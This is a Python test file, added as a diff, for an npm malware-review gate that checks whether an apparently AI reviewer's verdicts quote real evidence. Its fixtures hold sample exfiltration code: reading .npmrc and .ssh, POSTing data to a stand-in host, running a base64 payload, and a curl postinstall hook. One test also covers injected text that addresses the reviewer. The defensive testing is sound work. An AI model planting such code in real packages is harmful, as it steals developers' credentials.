@@ -1,0 +1,159 @@
+
+from npmdiffwatch import investigate_gate as g
+from npmdiffwatch.config import Config
+
+
+class _WS:
+    """The parts of a Workspace the gate reads."""
+    def __init__(self, files, read_full=(), scripts=True, facts=(), too_large=()):
+        self.files = {"flagged": {p: t.encode() for p, t in files.items()}}
+        self.read_full = set(read_full)
+        self.read_text = {("flagged", p): t for p, t in files.items() if ("flagged", p) in set(read_full)}
+        self.scripts_seen = {"flagged"} if scripts else set()
+        self.facts = list(facts)
+        self._too_large = list(too_large)
+        self.inv = Config().investigator
+        self.decoded_from = {}
+    def required_files(self): return ["setup.js", "index.js"]
+    def too_large(self): return self._too_large
+
+
+FILES = {"setup.js": "const t = require('fs').readFileSync(home + '/.npmrc', 'utf8');\n"
+                     "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);\n",
+         "index.js": "module.exports = function add(a, b) { return a + b; };\n"}
+ALL = [("flagged", "setup.js"), ("flagged", "index.js")]
+
+
+def _q(path, code): return {"version": "flagged", "path": path, "code": code}
+
+
+def _answer(verdict, **kw):
+    a = dict(verdict=verdict, confidence=0.9, reason="r", indicators=[], chain_source=None, chain_sink=None,
+             explanation=None)
+    a.update(kw)
+    return a
+
+
+def test_a_quoted_complete_chain_is_confirmed():
+    o = g.judge(_answer("malicious",
+                        chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("setup.js", "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);")),
+                _WS(FILES, ALL))
+    assert (o.verdict, o.outcome) == ("malicious", "confirmed")
+
+
+def test_malicious_without_a_valid_chain_stays_malicious_but_inconclusive():
+    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "not in the file at all"),
+                        chain_sink=_q("setup.js", "also not there, anywhere")), _WS(FILES, ALL))
+    assert (o.verdict, o.outcome) == ("malicious", "inconclusive") and o.rejected_quotes == 2
+
+
+def test_a_downgrade_with_coverage_and_an_explanation_is_disputed():
+    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b) { return a + b; };")),
+                _WS(FILES, ALL))
+    assert (o.verdict, o.outcome) == ("benign", "disputed")
+
+
+def test_a_quoted_downgrade_stands_without_reading_every_file():
+    o = g.judge(_answer("suspicious", explanation=_q("index.js", "module.exports = function add(a, b)")),
+                _WS(FILES, [("flagged", "index.js")]))
+    assert (o.verdict, o.outcome) == ("suspicious", "disputed")
+    assert any("setup.js" in n for n in o.notes)                    # what it did not read is noted for the reader
+
+
+def test_a_quoted_downgrade_stands_without_the_scripts_tool():
+    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
+                _WS(FILES, ALL, scripts=False))
+    assert o.outcome == "disputed"
+
+
+def test_a_downgrade_without_an_explanation_quote_is_inconclusive():
+    o = g.judge(_answer("benign"), _WS(FILES, ALL))
+    assert (o.verdict, o.outcome) == ("malicious", "inconclusive")
+
+
+def test_a_too_large_entry_point_is_noted_but_does_not_block_a_downgrade():
+    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
+                _WS(FILES, ALL, too_large=["dist/big.js"]))
+    assert (o.verdict, o.outcome) == ("benign", "disputed")
+    assert any("too large" in n for n in o.notes)
+
+
+def test_quotes_must_come_from_the_flagged_version():
+    a = _answer("benign", explanation={"version": "prior", "path": "index.js", "code": "module.exports = function add(a, b)"})
+    assert g.judge(a, _WS(FILES, ALL)).outcome == "inconclusive"
+
+
+def test_a_quote_from_a_file_it_did_not_read_is_rejected():
+    o = g.judge(_answer("malicious",
+                        chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("setup.js", "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);")),
+                _WS(FILES, [("flagged", "index.js")]))
+    assert o.outcome == "inconclusive"
+
+
+def test_text_addressing_the_reviewer_is_a_note_not_an_override():
+    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
+                _WS(FILES, ALL, facts=["index.js contains text that addresses the reviewer (possible injection)"]))
+    assert (o.verdict, o.outcome) == ("benign", "disputed")
+    assert any("addresses the reviewer" in n for n in o.notes)
+
+
+def test_the_answer_is_a_verdict_a_reason_and_its_evidence_with_no_checklist():
+    assert set(g.ANSWER_SCHEMA["required"]) == {"verdict", "reason", "chain_source", "chain_sink", "explanation"}
+    assert set(g.ANSWER_SCHEMA["properties"]) == {"verdict", "confidence", "reason", "chain_source", "chain_sink",
+                                                   "explanation", "indicators"}
+
+
+def test_an_install_command_quoted_as_written_matches_its_json_escaped_file():
+    pj = '{"scripts": {"postinstall": "curl -X POST -d \\"$(cat /tmp/x.txt)\\" http://c.example.invalid/u"}}'
+    ws = _WS({"package.json": pj}, [("flagged", "package.json")])
+    q = _q("package.json", 'curl -X POST -d "$(cat /tmp/x.txt)" http://c.example.invalid/u')
+    assert g._quote_ok(q, ws, [])
+
+
+SRC = ("function keys() {\n  const d = path.join(os.homedir(), '.ssh');\n  return fs.readdirSync(d);\n}\n"
+       "const req = https.request({ hostname: 'c.example.invalid', method: 'POST' }, (res) => { res.resume(); });\n"
+       "new Function(Buffer.from(p, 'base64').toString())();\n")
+
+
+def _match(code):
+    return g._quote_ok(_q("s.js", code), _WS({"s.js": SRC}, [("flagged", "s.js")]), [])
+
+
+def test_a_line_of_dots_stands_for_lines_left_out():
+    assert _match("function keys() {\n  ...\n  return fs.readdirSync(d);")
+
+
+def test_an_inline_elision_stands_for_code_left_out():
+    assert _match("const req = https.request({ hostname: 'c.example.invalid', method: 'POST' }, (res) => { /* ... */ });")
+    assert _match("function keys() { ... return fs.readdirSync(d);")
+
+
+def test_a_comment_the_model_added_is_ignored():
+    assert _match("new Function(Buffer.from(p, 'base64').toString())();  // decodes to: a request that sends a key")
+    assert _match("// the handler below only writes locally\nreturn fs.readdirSync(d);")
+
+
+def test_code_that_is_not_in_the_file_is_still_rejected():
+    assert not _match("function keys() {\n  ...\n  return fs.readFileSync(d + '/id_rsa');")
+    assert not _match("... https.request({ hostname: 'other.example.invalid' ...")
+
+
+def _decoded_ws(origin):
+    ws = _WS(FILES, ALL)
+    ws.read_text[("decoded", "d1")] = "https.request({ host: 'c.example.invalid' }).end(require('fs').readFileSync(k))"
+    ws.decoded_from = {"d1": origin}
+    return ws
+
+
+def test_a_chain_end_may_be_quoted_from_a_decode_of_the_package_s_own_value():
+    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("d1", "https.request({ host: 'c.example.invalid' })")), _decoded_ws("setup.js"))
+    assert (o.verdict, o.outcome) == ("malicious", "confirmed")
+
+
+def test_a_decode_of_a_value_the_model_supplied_is_not_evidence():
+    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("d1", "https.request({ host: 'c.example.invalid' })")), _decoded_ws(None))
+    assert o.outcome == "inconclusive"
